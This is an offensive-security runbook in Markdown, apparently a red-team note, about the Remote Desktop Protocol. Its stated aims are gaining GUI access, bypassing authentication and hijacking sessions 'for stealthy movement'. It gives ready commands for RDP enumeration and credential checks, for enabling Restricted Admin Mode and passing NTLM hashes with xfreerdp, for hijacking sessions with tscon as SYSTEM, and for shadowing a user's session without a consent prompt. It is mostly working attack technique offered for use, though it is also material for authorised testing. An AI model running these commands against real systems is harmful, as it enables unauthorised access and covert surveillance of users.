---
tags: [protocol, rdp, windows, lateral-movement, post-exploitation]
---

# 🖥️ RDP Protocol Runbook (400/500 Level)

> [!ABSTRACT]
> This runbook covers Remote Desktop Protocol (RDP) from discovery to advanced session hijacking.
> **Goal**: Gain GUI access, bypass authentication, and hijack active sessions for stealthy movement.

---

## 🔍 Phase 1: Recon & Enumeration

### 1. Identify RDP (nmap/netexec)
```bash
# General Info (Nmap)
nmap -p 3389 <TARGET> --script rdp-ntlm-info

# Check Credentials (netexec)
netexec rdp <TARGET> -u <USER> -p <PASS>
```

---

## 🚀 Phase 2: Advanced Authentication (400/500 Level)

### 1. Restricted Admin Mode (Pass-the-Hash RDP)
If Restricted Admin Mode is enabled, you can RDP into a host using only the NTLM hash.
```bash
# Enable Restricted Admin Mode (If you have local admin)
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Connect via xfreerdp
xfreerdp /v:<TARGET> /u:Administrator /pth:<NTHASH> /cert-ignore /restricted-admin
```

---

## 🧲 Phase 3: Session Hijacking & Shadowing

### 1. Session Hijacking (`tscon.exe`)
If you are `SYSTEM` on a host, you can hijack any active RDP session without a password.
```cmd
# 1. List Sessions
query user

# 2. Hijack Session ID 2
tscon.exe 2 /dest:console
```

### 2. Session Shadowing (Silent Observation)
Observe a user's session without interrupting them.
```cmd
# Requires local admin. Shadow Session 2 (no prompt)
mstsc.exe /shadow:2 /v:<TARGET> /noConsentPrompt /control
```

---

## 🛠️ Phase 4: Enabling RDP (Admin Only)

```powershell
# 1. Enable RDP in Registry
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -Value 0

# 2. Allow Firewall Rule
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# 3. Add User to RDP Group
net localgroup "Remote Desktop Users" <USER> /add
```

---

## 🔗 Related Notes
- [[Active Directory]] - For identifying users with RDP rights.
- [[Admin Reference]] - For user and group management.
- [[Pivoting & Tunneling]] - For reaching 3389 across segments.
- [[06-credentials/RUNBOOK]] - For extracting RDP credentials from memory.
